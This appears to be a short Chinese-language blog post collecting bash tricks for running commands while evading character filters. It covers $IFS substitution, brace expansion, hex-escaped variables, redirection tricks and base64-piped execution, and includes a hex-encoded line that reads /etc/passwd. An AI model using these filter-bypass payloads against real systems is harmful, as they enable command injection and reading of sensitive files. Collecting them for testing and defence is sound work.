---
title: bash tricks
date: 2020-3-13 18:09
tags: bash
---

> 在推上看到了一些新姿势，结合以前的重新总结一下linux下执行命令的技巧。

cat<1.txt

![img](/images/2020.2.30.1.png)

cat$IFS$91.txt

![img](/images/2020.2.30.2.png)

cat${IFS}1.txt

![img](/images/2020.2.30.3.png)

cat<>1.txt

![img](/images/2020.2.30.4.png)

{cat,1.txt}  

// 带参数的情况：{ls,-las,/var}

![img](/images/2020.2.30.5.png)

CMD=$’\x201.txt’&&cat$CMD

![img](/images/2020.2.30.6.png)

CMD=$’\x0a1.txt’&&cat$CMD

![img](/images/2020.2.30.7.png)

CMD=$’\x091.txt’&&cat$CMD

![img](/images/2020.2.30.8.png)

IFS=,;\`cat<<<cat,1.txt\`

![image-20200427094309711](/images/2020.2.30.12.png)

X=$'cat\x20/etc/passwd'&&$X ubuntu下没有测试成功

!! 执行上一条命令 ！+ 数字 执行历史命令

![img](/images/2020.2.30.9.png)

绕过其他字符( . / ; ` ‘ > 等)的姿势:

1.从环境变量(env)中提取：

![img](/images/2020.2.30.10.png)

2. base64+管道符执行：

![img](/images/2020.2.30.11.png)



## Reference

https://twitter.com/konsolitus/status/1241610891235225601

[https://b1ng0.top/2018/11/15/Blank%20Bypass/](https://b1ng0.top/2018/11/15/Blank Bypass/)